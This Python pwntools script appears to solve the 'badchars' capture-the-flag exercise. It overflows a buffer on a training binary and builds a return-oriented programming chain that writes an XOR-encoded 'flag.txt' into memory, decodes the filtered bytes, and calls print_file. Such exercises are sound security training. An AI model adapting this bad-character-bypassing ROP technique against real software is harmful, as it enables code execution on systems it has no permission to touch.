#!/usr/bin/python3
#coding: utf-8

from pwn import *
import sys

"""
Plan : 

    Write data using in memory
    0x0400634: mov qword ptr [r13], r12; ret;

    Bypass the badchar restriction 
    0x400628: xor byte ptr [r15], r14b; ret;

    Setup registers:
    0x40069c: pop r12; pop r13; pop r14; pop r15; ret;


We write in the .data section

    $ readelf --sections ./badchars
    [...]

    [23] .data   0000000000601028  00001028

-> write at 0x601028

---
    $ ropper -f badchars --badbytes 7867612e0a 
---
badchars are: 'x', 'g', 'a', '.'

"""

write_addr = 0x601030

buf = b'A' * 40

# setting up our register
buf += p64(0x40069c) # pop r12; pop r13; pop r14; pop r15

buf += b"fl\x20\x26\x6ft\x39t" # r12, string to write in memory
buf += p64(write_addr) # r13, write addr

buf += b"ABCDEFGH" # r14, xored char
buf += p64(write_addr + 2) # r15, 'a' addr

# write xored string in memory
buf += p64(0x0400634) # mov qword ptr [r13], r12; ret;

# decrypt the xored string
buf += p64(0x400628) # xor byte ptr [r15], r14b; ret;


# mov pointer and decrypt again ('g')
buf += p64(0x4006a2) # pop r15; ret;
buf += p64(write_addr + 3) # r15, 'g' addr

buf += p64(0x400628) # xor byte ptr [r15], r14b; ret;

# mov pointer and decrypt '.'
buf += p64(0x4006a2) # pop r15; ret;
buf += p64(write_addr + 4) # r15, '.' addr

buf += p64(0x400628) # xor byte ptr [r15], r14b; ret;

# mov pointer and decrypt 'x'
buf += p64(0x4006a2) # pop r15; ret;
buf += p64(write_addr + 6) # r15, '.' addr

buf += p64(0x400628) # xor byte ptr [r15], r14b; ret;

# setup $rdi before calling print_file()
buf += p64(0x4006a3) # pop rdi; ret;
buf += p64(write_addr) # addr of "flag.txt"

# extra ret to deal with the movaps issue on Ubuntu 18.04
buf += p64(0x4004ee) # ret

buf += p64(0x400510) # print_file@plt

sys.stdout.buffer.write(buf)